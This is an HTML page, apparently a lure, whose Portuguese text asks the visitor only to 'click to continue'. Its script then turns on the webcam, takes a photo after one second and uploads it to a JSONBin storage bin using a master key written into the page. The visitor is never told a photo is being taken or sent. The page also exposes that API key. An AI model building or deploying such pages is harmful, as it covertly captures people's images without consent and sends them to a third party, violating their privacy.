<!DOCTYPE html>
<html>
<body style="background:#111; color:white; text-align:center; font-family:sans-serif;">

<h2>Clique no botão para continuar</h2>
<button id="startBtn">Clique aqui para continuar</button>

<video id="video" width="320" height="240" autoplay style="display:none;"></video>
<canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
<p id="status"></p>

<script>
const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const status = document.getElementById('status');

// JSONBin
const JSONBIN_KEY = "$2a$10$TGWviiTU6WDwbnoyxXdO1OB.zfLXw2aPhoG4SChWWQYA757BpZBqO";
const BIN_ID = "69d30c2aaaba882197ca5757";

startBtn.addEventListener('click', async () => {
    startBtn.style.display = "none"; // esconde o botão
    video.style.display = "block";   // mostra o vídeo

    // Acessar câmera
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Espera 1 segundo para o vídeo ligar, depois tira foto
        setTimeout(async () => {
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            const foto = canvas.toDataURL('image/png');
            status.textContent = "Enviando foto...";

            // Buscar lista atual de fotos
            const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
                headers: { "X-Master-Key": JSONBIN_KEY }
            });
            const data = await res.json();
            const lista = data.record.record || [];

            // Adicionar nova foto
            lista.push(foto);

            // Atualizar JSONBin
            await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
                method: "PUT",
                headers: {
                    "Content-Type": "application/json",
                    "X-Master-Key": JSONBIN_KEY
                },
                body: JSON.stringify({ record: { record: lista } })
            });

            status.textContent = "Foto enviada com sucesso!";
            video.style.display = "none"; // esconde o vídeo após tirar a foto
        }, 1000);

    } catch (err) {
        alert("Erro ao acessar a câmera: " + err);
    }
});
</script>

</body>
</html>
